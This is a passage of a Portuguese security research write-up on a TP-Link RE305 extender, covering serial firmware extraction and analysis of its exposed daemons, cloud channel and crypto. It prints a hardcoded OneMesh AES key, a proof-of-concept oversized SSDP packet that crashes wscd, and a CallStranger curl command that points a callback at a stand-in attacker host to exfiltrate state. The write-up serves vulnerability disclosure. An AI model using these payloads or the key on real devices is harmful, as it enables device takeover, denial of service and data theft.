A receita é direta. No device: `tar czf` o diretório alvo em `/tmp/xfer.tar.gz`, calcula MD5 do arquivo, depois pra cada chunk `dd skip=N count=1` + `base64` no stdout com marcadores de início/fim. No PC: lê linhas até ver o marcador, decoda o bloco base64 entre marcadores, valida tamanho e MD5 individual do chunk, agrega num arquivo. Ao fim, verifica MD5 do agregado contra o que o device reportou no início.

Implementei isso num script Python único, controlando comandos via `pyserial`. O device não roda script algum — recebe linha de comando, devolve output, ponto. Três razões pra essa arquitetura:

1.  **Sem heredoc, sem script no /tmp do device.** Heredoc dentro de console serial busybox quebra com escapes esquisitos, e dropbear injeta `\r` em lugares que confundem o parser. Comando one-line por interação é previsível.
    
2.  **Sem state no device.** O PC controla qual chunk pediu, o device só responde idempotente. Se o script PC trava ou eu fecho o terminal por engano, refazendo o mesmo pedido o device entrega o mesmo chunk.
    
3.  **MD5 por chunk e MD5 do agregado.** UART em 115200 às vezes engole bytes em rajada longa, principalmente quando o terminal host (`tio`) tá no meio do caminho. Sem checksum por chunk eu só descobria a corrupção tentando extrair o tarball no PC.
    

O loop principal do PC manda pro device:

```python
cmd = (
    f"dd if=/tmp/xfer.tar.gz of=/tmp/c bs={chunk_size} skip={seq} count=1 2>/dev/null; "
    f"SZ=$(wc -c < /tmp/c | awk '{{print $1}}'); "
    f"MD5=$(md5sum /tmp/c | awk '{{print $1}}'); "
    f'echo "__BEG__{seq} $SZ $MD5"; '
    f"{encoder} < /tmp/c; "
    f'echo "__END__{seq}"'
)
```

Marcadores `__BEG__` e `__END__` precisam ser strings que **não aparecem** em saída de comando normal. Duplo underline + uppercase resolveu. E o lado PC só aceita a linha como BEG válido se for split em quatro tokens com `p[0] == '__BEG__'` e `p[1] == str(seq)` — descarta o eco da própria linha de comando que tecnicamente contém `__BEG__` como substring.

Pega de armadilha: o busybox do RE305 nem sempre tem `base64` standalone. Quando openssl tá presente (que é o caso aqui), `openssl enc -base64` faz o mesmo trabalho. Detecção runtime no início da sessão:

```python
link.write(
    "if command -v openssl >/dev/null 2>&1 && echo x|openssl enc -base64 >/dev/null 2>&1; "
    "  then echo __ENC__=openssl; "
    "elif echo x|base64 >/dev/null 2>&1; "
    "  then echo __ENC__=base64; "
    "else echo __ENC__=NONE; fi"
)
```

A outra otimização que vale lembrar é `stty -echo` antes de começar. Sem isso, cada comando volta ecoado no console e dobra o tráfego de retorno — pior, gera linhas que olham idênticas aos marcadores quando o parser é frouxo. Com `stty -echo` ativo, o output do device é limpo, só o resultado dos comandos.

Throughput observado em 115200 8N1 ficou em ~9 KB/s. `/etc` (~44 KiB compactado) saiu em 5 segundos, `/lib` (~160 KiB) em 18s, `/www` (1.5 MiB) em ~3 min, `/usr` em ~7s. O gargalo é exclusivamente o serial — `dd`, `md5sum`, `base64` rodam instantâneos no MT7628. Pra flash inteira (8 MiB) seriam ~15 minutos, o que ainda é mais rápido que o método via `md.b` no U-Boot que rodei na seção 9 (124 minutos pros mesmos 8 MiB, porque `md.b` printa hex e tem overhead muito maior).

Script completo em [`serial_transfer.py`](serial_transfer.py). Uso típico:

```bash
./serial_transfer.py --port /dev/ttyACM0 --baud 115200 \
    --remote-path /etc --output etc.tar.gz
```

Resume automático: se cair no meio, basta repetir o mesmo comando. O state em `etc.tar.gz.state` salva o próximo chunk a baixar e o output é appended chunk a chunk. Útil quando a sessão `tio` cai por timeout, ou quando o cabo do Flipper desconecta no meio de uma transferência longa.

A técnica não é específica do RE305. Vale pra qualquer device embarcado com console serial e shell root acessível — switch industrial, IP camera, gateway VoIP, set-top box, qualquer hardware com console depurável onde a saída é “consegui shell, agora preciso ler os binários no IDA”. É o passo concreto entre observar o boot e instrumentar a plataforma.

Com a árvore de filesystem no PC eu pude rodar `binwalk`, `strings`, `file` no rootfs todo, abrir os ELFs no Ghidra, cruzar com o firmware OEM baixado do site da TP-Link, e mapear o que vem a seguir.

* * *

## 12\. Mapeando a superfície via shell root

Shell em mãos, faço o que faria em qualquer pentest pós-acesso. Enumero serviços, processos, configurações. O resultado é mais grave do que esperava. Vários daemons proprietários da TP-Link, todos rodando como root, vários expostos em `0.0.0.0`.

### 12.1 Processos

```plaintext
/usr/bin/pfclient    (4 instâncias)
/usr/bin/tmpServer   (2 instâncias)
/usr/bin/tdpServer   (3 instâncias)
/usr/bin/cloud-brd   (3 instâncias)
/usr/bin/cloud-client
/usr/bin/client_mgmt
/usr/bin/smartipd    (3 instâncias)
/usr/bin/path_selection
/usr/bin/tddp
/usr/sbin/dropbear
/usr/sbin/uhttpd
wpsd                 (3 instâncias)
wifid
```

ubus APIs expostas (`ubus list`):

```plaintext
PFClient, client_mgmt, cloud_client, service, system, tdpServer, tmpServer
```

Nada disso é OpenWrt vanilla. Tudo código proprietário TP-Link, documentação pública praticamente inexistente.

### 12.2 Portas em listen

`netstat -tulnp`:

```plaintext
tcp  0.0.0.0:22       LISTEN   1349/dropbear
tcp  0.0.0.0:80       LISTEN   653/uhttpd
tcp  0.0.0.0:6000     LISTEN   762/path_selection
tcp  0.0.0.0:6001     LISTEN   762/path_selection
tcp  127.0.0.1:20002  LISTEN   636/tmpServer
udp  0.0.0.0:1040              442/tddp
udp  0.0.0.0:20002             637/tdpServer
```

### 12.3 dropbear 2011.54

```plaintext
$ /usr/sbin/dropbear -V
Unknown argument -V
Dropbear sshd v2011.54
```

Build 2011.54, outubro de 2011. Nove anos de drift até o firmware compilado em fevereiro de 2020. CVEs que afetam essa versão e rodam pre-auth ou imediatamente post-auth: CVE-2016-7406 (format string em messaging), CVE-2016-7407 (DoS via parsing malformado), CVE-2016-7408 (command injection em `dbclient`), CVE-2016-7409 (information disclosure), CVE-2017-9078 (use-after-free pós-auth).

Flags custom TP-Link no binário:

```plaintext
-C    Use Web Server account login    (NÃO standard dropbear)
-L    Enable SSH session login        (NÃO standard dropbear)
```

A combinação `SysAccountLogin 'off'` + flag `-C` indica que o dropbear da TP-Link não usa `/etc/shadow` por default, usa um modelo de auth via Web Server account, provavelmente cifrado com a chave RSA que está em `/etc/config/accountmgnt`. Mesmo que o auth custom funcione corretamente, a versão é cripto e implementação antiga demais. CVE-2017-9078 sozinho (use-after-free post-auth) basta pra um auth bypass dar root.

### 12.4 `path_selection`

Daemon proprietário em `0.0.0.0:6000` e `0.0.0.0:6001` TCP. Binário `/usr/bin/path_selection`, 54.792 bytes, build Feb/2020. Funções via strings:

```plaintext
handle_debug_event           (interface de debug acessível externamente)
handle_error_event
handle_path_selection
handle_read_event
handle_sta_assoc_event
handle_sta_disassoc_event
handle_update_config_event   (config update via socket)
path_selection_finit
path_selection_init
```

Dois sockets TCP públicos aceitando `handle_debug_event` e `handle_update_config_event`. Reverse via Ghidra ou IDA é mandatório pra mapear o wire protocol, mas o nome dos handlers já sugere superfície interessante. `update_config_event` aceita string sem validação? `debug_event` aceita comando shell?

Sem CVE público.

### 12.5 TDDP em `0.0.0.0:1040` UDP

O daemon que mais me chamou atenção do passe inicial. `tddp` (TP-Link Device Debug Protocol) é protocolo proprietário de gerência out-of-band, historicamente vetor de CVE-2020-12109 em vários roteadores TP-Link.

Comandos enumerados via strings em `/usr/bin/tddp`:

```plaintext
tddp_cmd_setCfg
tddp_cmd_getCfg
tddp_cmd_spCmd               (special command, tipicamente shell exec)
tddp_cmd_getHwDesc / HwID / FwID / MAC / DevID / OEMID
tddp_cmd_setOEMID / setDevID
tddp2_cmd_setPin             (TDDPv2 set PIN)
tddp_cmd_getGpioStatus
tddp2_cmd_setMac
```

Hooks críticos:

```plaintext
tddp_hook_setmac %02X:%02X:%02X:%02X:%02X:%02X
tddp_hook_erase_radio        (pacote UDP pode APAGAR a partição radio)
```

Funções perigosas no binário:

```plaintext
strcpy, strcat, vsprintf, popen, system
```

E uma string que parece format string passada pra `system()`:

```plaintext
echo $(getfirm HARDVERSION) | tr -d "\n"
```

Se o output de `getfirm HARDVERSION` é influenciável pelo atacante via `tddp_cmd_setCfg`, é command injection direto via pacote UDP. Não validei ainda, probing UDP dedicado ficou pra próxima sessão, não quis correr risco de DoS o device com pacote malformado e perder o uptime atual.

Auth do TDDP no binário:

```plaintext
tddp_md5_calc
tddp_md5_verify_digest
tddp_des_min_do              (single DES auth)
```

Single DES (`des_min_do`) tem chave de 56 bits, quebrável por brute-force em hardware comum desde 1998. Se o digest do TDDP usa single DES como camada de proteção, atacante MITM com hardware razoável quebra a chave em umas 24h e fala TDDP autenticado.

CVE-2020-12109 foi publicada em 23 de abril de 2020. Firmware deste RE305 é de 12 de fevereiro de 2020. Pré-patch. Provável variant afetada. Confirmação pendente via teste UDP dedicado.

Operações destrutivas acionáveis via UDP no port 1040. `tddp_cmd_setCfg` altera config persistente sem autenticação plain. `tddp2_cmd_setMac` muda MAC address (impersonation, ou conflito em LAN). `tddp_cmd_setOEMID` muda OEM ID. `tddp_hook_erase_radio` apaga a partição radio, perda permanente de calibração WiFi, brick parcial do device sem JTAG.

### 12.6 tdpServer em `0.0.0.0:20002` UDP

Nome similar mas daemon diferente, `tdp`, não `tddp`. Implementa o protocolo OneMesh de descoberta de devices. Binário `/usr/bin/tdpServer`, 160.108 bytes. Funções principais:

```plaintext
tdp_client_send_probe
tdp_client_attach_master / auto_attach_master
tdp_onemesh_slave_store_rsa_pub        (armazena pubkey RSA do master)
tdp_onemesh_slave_offer_slave_key
tdp_onemesh_master_get_rsa_pub
tdp_server_parse_probe
tdp_server_parse_attach_master
tdp_server_parse_slave_key_offer
```

Listening em `0.0.0.0:20002` UDP, acessível externamente. Atacante na LAN inicia OneMesh slave-key exchange MITM.

E o crypto que protege o key exchange. Inspeção inicial dos imports:

```plaintext
$ strings /usr/bin/tdpServer | grep -E 'DES|AES'
DES_encrypt3
DES_decrypt3
DES_set_key_unchecked
DES_encrypt1
DES_encrypt2
DES_ede3_cbc_encrypt
DES_ecb_encrypt
DES_pcbc_encrypt
des_min_do
AES_set_decrypt_key
AES_set_encrypt_key
AES_cbc_encrypt
```

Mix de primitivas. Mas a inspeção dos imports não conta a história — saber qual é usada onde requer ver o disasm.

Reverte a função `sym.tdp_server_parse_slave_key_offer` (a que processa o pacote de slave-key offer no master side do OneMesh, função de 2948 bytes em `/usr/bin/tdpServer`). Comando exato:

```bash
$ r2 -2 -q -e scr.color=0 -c 'aaa; s sym.tdp_server_parse_slave_key_offer; pdf' \
    /usr/bin/tdpServer | grep -iE "(tpapp_aes|str\.|TPONEMESH)"
0x004191e0      d80a4626       addiu a2, s2, 0xad8         ; 0x420ad8 ; "TPONEMESH_Kf!xn?gj6pMAt-wBNV_TDP"
0x004191e4      e7cb1104       bal sym.tpapp_aes_decrypt
...
0x004199c4      e880998f       lw t9, -sym.tpapp_aes_encrypt(gp)
0x004199d4      65c91104       bal sym.tpapp_aes_encrypt
```

![](/assets/img/tp-link-re305-uart/img-10.png)

Extraindo a string direto do binário pra confirmar:

```bash
$ python3 -c "
with open('/usr/bin/tdpServer','rb') as f:
    data = f.read()
# offset 0x20ad8 em .rodata (file offset, não VA)
idx = data.find(b'TPONEMESH_')
print(f'offset (file): {hex(idx)}')
print(f'value: {data[idx:idx+32]!r}')
print(f'length: {len(data[idx:].split(chr(0).encode())[0])} bytes')
"
offset (file): 0x20ad8
value: b'TPONEMESH_Kf!xn?gj6pMAt-wBNV_TDP'
length: 32 bytes
```

A primeira string carregada antes do `tpapp_aes_decrypt` é uma constante hardcoded em `.rodata`. Exatamente 32 bytes ASCII printáveis. É a **chave AES-256** usada pra cifrar e decifrar o slave key exchange do OneMesh. Hardcoded no binário, idêntica em todas as unidades RE305 V3 (e provavelmente em toda a linha TP-Link que compartilha esse build do tdpServer).

A função `des_min_do` existe sim e usa single DES (`DES_encrypt1` em loop, sem `DES_encrypt2/3`), mas ela é chamada por uma função separada (`fcn.00404228` → `fcn.00404420`), não pela path de slave-key exchange. O que `des_min_do` cifra está em outra surface — provavelmente código legacy ou helper para outro tipo de mensagem TDP. Não confirmei o uso exato dessa rotina nesse passe.

A inferência inicial F20 (“DES single como auth no OneMesh”) nasceu de ler o `strings` puro e ver `DES_encrypt1`, `des_min_do` nos imports. Estava errado. Revisando depois do RE:

O slave-key exchange do OneMesh usa **AES-256-CBC**, não DES single. Mas com **chave hardcoded global** `TPONEMESH_Kf!xn?gj6pMAt-wBNV_TDP` (32 bytes ASCII), igual em toda a frota TP-Link da linha RE/OneMesh que compartilha esse `tdpServer`. Qualquer um com o firmware decifra qualquer slave-key offer capturado entre RE305 e router master, e forja mensagens válidas após autenticar com o MAC do par. Bate com a falha que documento na seção 15 no `crypto.lua` — `2EB38F7E...427F7836` é a chave AES-256 do path `enc_for_onemesh` da Lua side, e `TPONEMESH_Kf!xn?gj6pMAt-wBNV_TDP` é a chave do path C side do tdpServer. Duas chaves diferentes, dois canais OneMesh, mesma falha de design dos dois lados.

Source path vazado no binário pelas strings de erro (assertion / debug logs):

```plaintext
$ strings /usr/bin/tdpServer | grep -E "\.c:[0-9]+" | sort -u | head -10
tdpOneMesh.c:711
tdpOneMesh.c:715
...
tdpOneMesh.c:3138         ← linha que carrega a chave TPONEMESH_K... pra AES decrypt
tdpOneMesh.c:3147         ← linha do erro "Failed to decrypt."
tpAppLua.c:44
tpAppLua.c:53
```

Linha 3138 é onde a chave hardcoded é carregada antes da chamada `tpapp_aes_decrypt`. Build não removeu paths de assertion em release. Atacante com o binário sabe exatamente em qual arquivo .c (fora do firmware open-source) está cada decisão de design da TP-Link nesse subsistema.

### 12.7 uhttpd sem TLS

`/etc/config/uhttpd`:

```plaintext
option listen_https '0.0.0.0:443'
option listen_http  '0.0.0.0:80'
option cert '/etc/uhttpd.crt'
option key  '/etc/uhttpd.key'
```

Realidade do binário:

```plaintext
$ strings /usr/sbin/uhttpd | grep -i tls
uhttpd: TLS support not compiled, ignoring -%c
```

`netstat`:

```plaintext
tcp  0.0.0.0:80   LISTEN   653/uhttpd
(:443 ausente)
```

WebUI roda em HTTP cleartext. Config lista `listen_https`, mas o binário foi compilado sem suporte TLS, flags HTTPS são silently dropped. Credenciais do usuário trafegam em plain HTTP.

### 12.8 `rfc1918_filter` desabilitado

`cat /etc/config/uhttpd`:

```plaintext
option rfc1918_filter '0'
```

Proteção contra DNS rebinding OFF no build BR de fevereiro de 2020. Cenário: usuário visita site malicioso pelo browser na LAN, site faz XHR/fetch pra `http://192.168.0.254/` ou nome resolvido pra IP RFC1918, sem `rfc1918_filter` o uhttpd aceita a request com Host header reescrito por DNS rebinding, bypass de Same-Origin Policy. Combinado com admin com senha vazia em factory state e HTTP plain, é takeover completo via browser do usuário.

### 12.9 SSH host keys em ramfs

```plaintext
$ mount | grep etc
none on /etc type ramfs (rw,relatime)
$ ls -la /etc/dropbear/
-rw-------    1 root     root    457 Jan  1 00:00 dropbear_dss_host_key
-rw-------    1 root     root    427 Jan  1 00:00 dropbear_rsa_host_key
```

`/etc` é ramfs, regenerado a cada boot. SSH host keys geradas runtime, não são shipped nem shared entre devices. Positivo, evita o problema clássico de OEM distribuir a mesma host key em milhões de unidades.

Mas keys regeneradas a cada boot significa que o cache `known_hosts` do cliente SSH invalida a cada reboot, usuário treina pra ignorar MITM warning. E o PRNG seed pra geração no boot inicial pode ser fraca (entropy pool zerada em hardware sem TRNG, e o MT7628 não tem TRNG hardware-grade), keys previsíveis. Sem persistência, sem auditoria de mudança de keys.

Hygiene fail, não CVE-class.

### 12.10 wscd — UPnP IGD com libupnp 1.3.1 (de 2007, vulnerável)

`/bin/wscd` é o daemon WPS + UPnP Internet Gateway Device do RE305. 260 KiB, MIPS LE, stripped. Sobe na boot via init script padrão e fica em SSDP multicast em `239.255.255.250:1900 UDP` + HTTP server interno (porta dinâmica) servindo `description.xml`, action invocations SOAP, eventing.

A versão da stack UPnP está literalmente no User-Agent que o próprio daemon manda em respostas HTTP. Capturo via strings:

```plaintext
$ strings /bin/wscd | grep -i "UPnP/"
%s/%s, UPnP/1.0, Portable SDK for UPnP devices/1.3.1

$ strings /bin/wscd | grep -i "GCC"
GCC: (Buildroot 2012.11.1) 4.6.3
```

**libupnp 1.3.1, build de 2012, gcc 4.6.3.** A versão 1.3.1 é de **junho de 2007**. A 1.6.18 (janeiro 2013) já incluía fixes para os seguintes CVEs que afetam diretamente 1.3.1:

| CVE | Função | Impacto |
| --- | --- | --- |
| CVE-2012-5958 | `unique_service_name()` em ssdp\_server.c | Stack buffer overflow via SSDP M-SEARCH com header `ST` malicioso, **pre-auth RCE** |
| CVE-2012-5959 | `unique_service_name()` | Variante do mesmo overflow |
| CVE-2012-5960 | `unique_service_name()` | Variante do mesmo overflow |
| CVE-2012-5961 | `parser_parse_headers()` em httpparser.c | Header parsing overflow |
| CVE-2020-12695 | CallStranger — protocolo design flaw em SUBSCRIBE callback | Reflection amplification, data exfil |

Funções literalmente presentes no binário, na text section, confirmadas pelo radare:

```plaintext
$ nm /bin/wscd | grep -E '(unique_service_name|ssdp_request_type|parser_parse)'
0041b76c T unique_service_name
0041ba2c T ssdp_request_type1
0041bb1c T ssdp_request_type
00424130 T parser_parse_responseline
00424500 T parser_parse_headers
00424890 T parser_parse_entity
```

Isso é o pacote de funções afetado por CVE-2012-5958..5961 in situ, sem patch.

Impacto direto. wscd roda como root (escalating from procd init). Atacante na LAN doméstica do RE305 manda um pacote UDP unicast/multicast pra `port 1900` com header `ST` maior que o buffer esperado, sobrescreve return address ou ROP gadgets, ganha shell root sem credencial. O range extender, na configuração típica de “estende a wifi de casa”, está alcançável por qualquer dispositivo na mesma rede WiFi de hóspedes.

Reprodução do reconhecimento mínimo (LAN, sem disparar o overflow):

```bash
# Confirma que o RE305 responde SSDP M-SEARCH normal (sanity check)
$ python3 -c "
import socket
m = (b'M-SEARCH * HTTP/1.1\r\n'
     b'HOST: 239.255.255.250:1900\r\n'
     b'MAN:\"ssdp:discover\"\r\n'
     b'MX: 2\r\n'
     b'ST: ssdp:all\r\n\r\n')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(3)
s.sendto(m, ('239.255.255.250', 1900))
while True:
    try:
        d, a = s.recvfrom(65535)
        print(f'--- from {a} ---')
        print(d.decode(errors='replace'))
    except socket.timeout: break
"
```

Resposta esperada do RE305 (User-Agent confirma o daemon e a versão):

```plaintext
--- from ('192.168.0.x', 1900) ---
HTTP/1.1 200 OK
CACHE-CONTROL: max-age=1800
DATE: ...
EXT:
LOCATION: http://192.168.0.x:<port>/IGDdevicedesc.xml
SERVER: Linux/2.6.36, UPnP/1.0, Portable SDK for UPnP devices/1.3.1
ST: upnp:rootdevice
USN: uuid:...
```

A linha `SERVER:` confirma a versão vulnerável diretamente do device, sem precisar dump de firmware. Esse é o fingerprint que vai no ticket de PSIRT.

PoC do overflow CVE-2012-5958 — não rodei aqui pra não derrubar meu próprio device durante a análise, mas a forma do payload é documentada publicamente:

```bash
# AVISO: este payload é destrutivo e crasha o wscd. Apenas referência pro PSIRT.
$ python3 -c "
import socket
# Header ST oversized — buffer alvo era ~180 bytes em 1.3.1, mando ~2000
oversize_st = b'uuid:' + (b'A' * 2000) + b'::urn:schemas-upnp-org:service:Foo:1'
m = (b'M-SEARCH * HTTP/1.1\r\n'
     b'HOST: 239.255.255.250:1900\r\n'
     b'MAN:\"ssdp:discover\"\r\n'
     b'MX: 1\r\n'
     b'ST: ' + oversize_st + b'\r\n\r\n')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(m, ('192.168.0.x', 1900))   # unicast ao device alvo
"
```

Em libupnp 1.3.1, isso entra no `unique_service_name()` (`ssdp_server.c:~600`) que faz `strcpy` em buffer fixed-size do header `ST`. Resultado em produção (sem ASLR significativo nesse build, e o MT7628 não tem stack canary): crash do wscd com PC controlável, segue ROP/shellcode na stack pra elevação de execução em root. Confirmação dinâmica fica pra fora desse paper estático e pro próximo passo do disclosure formal.

CallStranger (CVE-2020-12695) é design flaw — o CallBack URL de UPnP eventing aponta externamente. O atacante manda SUBSCRIBE pro extender com `CALLBACK: <http://atacante.example/x>`, o extender envia eventos pra esse URL. Reflection amplification + exfil de informação interna (state do device).

Reprodução do CallStranger:

```bash
# Discover service URL primeiro (via M-SEARCH normal acima), depois:
$ LOCATION='http://192.168.0.x:port/event_url'  # do response do M-SEARCH
$ curl -X SUBSCRIBE "$LOCATION" \
    -H "CALLBACK: <http://atacante.example.com/exfil>" \
    -H "NT: upnp:event" \
    -H "TIMEOUT: Second-1800" \
    -v
```

Resposta com `200 OK` + header `SID:` confirma subscription criada. Em seguida o RE305 começa a fazer NOTIFY POST contra `atacante.example.com/exfil` com payloads de evento UPnP — exfil sem auth do state interno.

Hardening que TP-Link teria como fazer e não fez:

*   Upgrade libupnp pra 1.14.x atual (release de 2024) — fix de 13 anos disponível, embargado por hábito de não atualizar dependências em produtos consumer
    
*   Disable UPnP IGD por default (a maioria dos roteadores enterprise faz isso há anos)
    
*   Adicionar binding restrito à LAN, sem multicast cross-network
    
*   Substituir por implementação custom validada
    

Não tem CVE público específico apontando “TP-Link RE305 com libupnp 1.3.1 in production em 2020/2024”. Family CVE — CVE-2012-5958 — bate diretamente no código que dumpei.

### 12.11 Daemons restantes (wifid, nrd, nvrammanager, smartipd)

Catalogados aqui pra completude. Sem detalhe de finding-class novo, surface ainda em mapeamento.

`wifid` (268 KiB, `/usr/bin/wifid`). Daemon de gerenciamento WiFi. Imports `system`, `popen`, `sprintf`, `strcpy`, `fork`. Lê config de `/tmp/wifi.conf`, `/tmp/wifi_prelink_config`, `/tmp/wifi_scan_2g.result`. Sem rede direta (não tem `bind`/`accept`), comunicação via netlink ou unix socket. Atacante na LAN sem shell não chega direto, mas se controla um dos arquivos de config (via `wscd` UPnP control point ou via Lua-template injection do uhttpd), pode disparar `system()` em payload controlado. Vetor indireto.

`nrd` (254 KiB, `/usr/sbin/nrd`). Network Roaming Daemon do pacote Quantenna/Qualcomm de WiFi band steering. Functions: `steeralg_init`, `triggermon_init`, `estimator_init`, `stadb_init`, `steerexec_init`, `wlanif_init`, `netdb_init`. Surface 100% interna (netlink + ubus). Não foi observado bind em socket inet. Apesar do tamanho, é coordenador interno, não vetor de exposição externa. Sem CVE direto previsto.

`nvrammanager` (174 KiB, `/usr/bin/nvrammanager`). Gerencia escrita em flash via `/proc/mtd`, e expõe API via ubus (`/var/run/ubus.sock`). Imports `system`, `sprintf`, `strcpy` — paths perigosos se input externo chega às chamadas shell. É o daemon que provavelmente consome `cloud_push 'new_firmware'` da seção 13 (cadeia: cloud-brd recebe URL → cloud-client baixa → nvrammanager grava na partição). Vetor de RCE em cadeia se atacante conseguir injetar URL ou conteúdo controlado em qualquer ponto dessa cadeia.

`smartipd` (54 KiB, `/usr/bin/smartipd`). Daemon de “smart IP” / DHCP enhancement. Lê `/tmp/device.info`, `/tmp/udhcpd.info`, `/tmp/wifi_runtime_info.*`. Sem bind direto inet. Pequeno o suficiente pra varredura mas baixa prioridade no pentest.

Pra todos esses, finding-class ainda não confirmado nesse passe estático — surface mapeada com hipóteses, validação dinâmica fica pendente pro paper de continuidade ou pro disclosure formal.

* * *

## 13\. Canal cloud TP-Link (cloud-brd + cloud-client)

Com o filesystem em mãos eu fui catalogar daemons e topei com dois binários no `/usr/bin` que paper nenhum sobre a linha RE-XXX da TP-Link discute em profundidade: `cloud-brd` (250 KiB) e `cloud-client` (117 KiB). Iniciados por `/etc/init.d/cloud_brd` (START=98) e `/etc/init.d/cloud_client` (START=99), os dois últimos no boot, depois de tudo configurado.

O `cloud-brd` é “cloud broker”. O `cloud-client` consome ele via `ubus`, kernel já com tudo subido. Lendo a config:

```plaintext
$ cat /etc/cloud_config.cfg
{
  "cloud": {
    "sefDomain": "n-deventry-gw.tplinkcloud.com",
    "sefPort": 443,
    "defaultSvr": "n-devs-gw.tplinkcloud.com",
    "defaultPort": 443,
    "defaultValidTime": 172800
  },
  "default": {
    "heartbeat_interval_ms": 235000,
    "request_timeout_ms": 5000,
    ...
    "reconnect_random_time_min_ms": 2000,
    "reconnect_random_time_max_ms": 256000,
    "cer_file": "/etc/certificate/2048_newroot.cer"
  }
}
```

Esse é o canal de management remoto da TP-Link. Heartbeat a cada ~4 minutos, reconnect com jitter, dois servidores (entry gateway e default service). Mesmo paradigma que ISP usa em TR-069, só que cross-vendor: aqui é a própria TP-Link operando o controle remoto, não a operadora.

O que o cloud manda. Conta no `/etc/config/cloud_config`:

```plaintext
config cloud_push 'new_firmware'
config cloud_push 'device_legality'
    option illegal_type '0'
    option illegal '0'
config cloud_reply 'device_status'
    option bind_status '0'
    option need_unbind '0'
    option need_checkupgrade '1'
config cloud_reply 'upgrade_info'
config cloud_device 'info'
    option alias 'RE305'
```

A leitura literal disso é que a cloud TP-Link pode:

*   Empurrar firmware novo (`cloud_push 'new_firmware'`) — o device baixa e instala
    
*   Marcar o device como ilegal (`cloud_push 'device_legality'` com `illegal_type`) — bricking remoto, suspeito ser anti-pirataria de OEM
    
*   Mudar status de binding (`bind_status`, `need_unbind`) — desvincular o device de uma conta TP-Link à força
    
*   Forçar verificação de upgrade (`need_checkupgrade`)
    

A questão imediata é se o canal valida o cert do servidor ou não — clássico ponto de falha em embedded. Abro o `cloud-brd` no radare pra ver o argumento que vai pro `SSL_CTX_set_verify`:

```bash
$ r2 -2 -q -e scr.color=0 -c 'aaa; axt @ sym.imp.SSL_CTX_set_verify' /usr/bin/cloud-brd
(nofunc) 0x4015a8 [UNKNOWN] tge v0, v1, sym.imp.SSL_CTX_set_verify
sym.cloud_socket_connect 0x42dbb0 [CALL] jalr t9

$ r2 -2 -q -e scr.color=0 -c 'aaa; s 0x42dba0; pd 6' /usr/bin/cloud-brd
```

```plaintext
0x0042dba4    lw t9, -sym.imp.SSL_CTX_set_verify(gp)
0x0042dba8    move a0, s0              ; ctx
0x0042dbac    addiu a1, zero, 1        ; mode = SSL_VERIFY_PEER
0x0042dbb0    jalr t9
0x0042dbb4    move a2, zero            ; callback = NULL
```

Mode = `1` = `SSL_VERIFY_PEER`, não `0` (`SSL_VERIFY_NONE`). Validação habilitada. Mas a CA store é exclusivamente `/etc/certificate/2048_newroot.cer`:

```bash
$ openssl x509 -in /etc/certificate/2048_newroot.cer -noout -subject -issuer -dates
subject=CN = tp-link-CA
issuer=CN = tp-link-CA
notBefore=Jan 19 08:27:52 2018 GMT
notAfter=Jan 19 08:37:52 2068 GMT

$ openssl x509 -in /etc/certificate/2048_newroot.cer -noout -text | head -8
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: ...
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN = tp-link-CA
        Validity
            Not Before: Jan 19 08:27:52 2018 GMT
            Not After : Jan 19 08:37:52 2068 GMT
```

![](/assets/img/tp-link-re305-uart/img-11.png)

CA self-signed da própria TP-Link, **válida por 50 anos** (2018 → 2068). Toda a confiança do canal cloud recai em uma única chave privada da TP-Link. Se essa chave vazar — interno comprometido, supply chain attack, OEM-side data breach — toda CPE da linha RE confiando nessa CA aceita qualquer cert assinado pelo atacante. Não tem revocation cross-fleet realista. Não tem fallback para CA pública. Não tem pinning múltiplo. E o cert dura 50 anos.

E o atacante não precisa nem da CA. O `defaultSvr` é `n-devs-gw.tplinkcloud.com` resolvido via DNS. Se o atacante controla DNS do device (DHCP rogue, MITM no link, rogue resolver) e tem cert assinado pela tp-link-CA, MITM completo, com TLS verde do lado do device. A surface real é a chave privada da CA da TP-Link.

Comparação com o que vi no ZTE F689 com Claro: lá o ACS roda em domínio público (`tr069.sdm.virtua.com.br`) com cert WebPKI normal e mTLS inexistente. Aqui o RE305 cloud roda em domínio TP-Link (`tplinkcloud.com`) com cert privada. Modelos diferentes, mas ambos com point of failure único: lá o ACS sem auth, aqui a CA single-trust.

Não tem CVE público que documenta especificamente esse cenário de cloud-channel TP-Link com CA fechada de 50 anos. Existem CVEs em outros vendors da mesma classe (Mirai-era CVEs em Realtek RTL819x cloud daemons, CVE-2020-12695 em TR-069 ACS de operadora). Nenhum apontando esse paradigma da TP-Link diretamente.

### 13.1 Cadeia de firmware push e verificação

Pergunta direta: se a cloud pode pushar firmware, o que verifica a integridade e autenticidade desse firmware antes da escrita na flash? Cobri a cadeia completa.

**Passo 1 — push notification.** Cloud manda comando `push` com `msgType=newFirmware` via canal TLS. O handler em Lua é `/usr/lib/lua/cloud/push.lua`:

```lua
local function newFirmware(msg)
    local data = msg.params.data or {}
    local msgId = data.msgId
    local data_time = data.time
    local content = data.content
    -- parameter check
    if msgId == nil or data_time == nil or content == nil then
        ret[ERR_CODE] = ERROR_PARAMETER_INVALID[1]
    else
        sys.fork_exec("cloud_getFwList") --get new firmware info from cloud.
    end
end
```

Validação no Lua = só checa que `msgId/time/content` não são `nil`. Sem signature, sem nonce, sem replay protection. O canal TLS é a única autenticidade desse passo.

**Passo 2 — fetch firmware list.** Lua dispara `cloud_getFwList` (`/usr/sbin/cloud_getFwList`, também Lua script 3 KiB). Faz request síncrono `getIntlFwList` pra cloud, recebe JSON com `fwUrl`, `fwVer`, `fwReleaseDate`, etc., e salva em UCI:

```lua
uci_r:set("cloud_config", "upgrade_info", "download_url", fw.fwUrl)
uci_r:set("cloud_config", "upgrade_info", "version", fw.fwVer)
...
uci_r:commit("cloud_config")
```

Validação aqui = comparação semântica de versão (não baixa se versão atual ≥ versão remota). Não verifica origem da URL. A URL vem direto do JSON da cloud — se atacante controla a cloud, ele controla a URL.

**Passo 3 — download.** `/usr/sbin/cloud_download` (POSIX shell script) chama curl:

```bash
curl -C - -# -L -e ';auto' -o "$2" -g "$1" -Y 1 -y ${TIMEOUT} > /dev/null 2>&1 &
```

Curl sem `--cacert` explícito, depende do CA store default do sistema. Sem hash check do arquivo baixado. Suporta resume (`-C -`), follow redirects (`-L`). O download é apenas transporte — autenticação fica pro próximo passo.

